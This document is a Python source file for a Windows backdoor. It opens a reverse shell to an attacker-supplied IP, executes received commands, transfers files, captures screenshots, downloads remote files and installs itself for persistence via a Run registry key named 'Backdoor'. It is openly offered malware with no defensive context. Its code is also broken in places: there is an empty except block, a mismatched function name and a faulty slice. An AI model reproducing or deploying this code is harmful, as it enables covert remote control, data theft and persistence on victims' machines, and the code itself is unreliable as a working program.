#!/usr/bin/python


import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss



def reliable_send(data):
        json_data=json.dumps(data)
        sock.send(json_data)





def reliable_recv():
        data=""
        while True:
                try:
                        data=data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue
def id_admin():
        global admin
        try:
                temp=os.listdir(os.sep.join([os.environ.get('SystemRoot', 'c:\windows'),'temp']))
        except:
                admin="[!!] User Priviligies!"
        else:
                admin = "[+] Administrator Privileges!"

def screenshot():
        with mss() as screenshot:
                screenshot.shot()


def download(url):
        get_response = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name,'wb') as out_file:
                out_file.write(get_response.content)

def connection():
        while True:
                time.sleep(20)
                try:
                        sock.connect(('your ip address',54321))
                        shell()
                except:
def shell():
        while True:
                command=reliable_recv()
                if command == 'q':
                        break
                elif command[:2] == "cd" and len(command) >1:
                        try:
                                os.chdir(command[3:])
                        except:
                                continue
                elif command == 'help':
                         help_options = '''dowload path --->Download a file from the internet
                                         upload path ---> Upload a File To Target PC
                                        start url --->Start a program on Target PC
                                        screeenshot ---> Taje a Screenshot Of Target Monitor
                                        chech --> Check for administrator Priviliges
                                        q    ---> Eixt The REverse Shell '''
                         reliable_send(help_options)
                elif  command[:8] == 'download':
                        with open(command[9:], 'rb') as file:
                                reliable_send(base64.b64encode(file.read()))
                elif command[:6] == 'upload':
                        with open(command[7:], 'wb') as fin:
                                file_data = reliable_recv()
                                fin.write(base64.b64decode(file_data))
                elif command[:3] == 'get':
                        try:
                                download(command[4:1])
                                reliable_send("[+] Downloaded file from specified URL")
                        except:
                                reliable_send("[!!] Failed to download that file")
                elif command[:10] == 'screenshot':
                        try:
                                screenshot()
                                with open('monitor-1.png','rb') as sc:
                                        reliable_send(base64.b64encode(sc.read()))
                                os.remove('monitor-1.png')
                           except:
                                reliable_send("[!!] Failed To Take Screenshot")
                elif command[:5] == 'start':
                        try:
                                subprocess.Popen(command[6:],shell=True)
                                reliable_send("Started")
                        except:
                                reliable_send("[!!] Failed to start")
                elif command[:5] == 'check':
                        try:
                                is_admin()
                                reliable_send(admin)
                        except:
                                reliable_send("Cant Perform The Check")
                else:
                        proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                        result=proc.stdout.read() + proc.stderr.read()
                        reliable_send(result)

location=os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V Backdoor /t REG_SZ /d "' + location + '"',shell=True)



sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
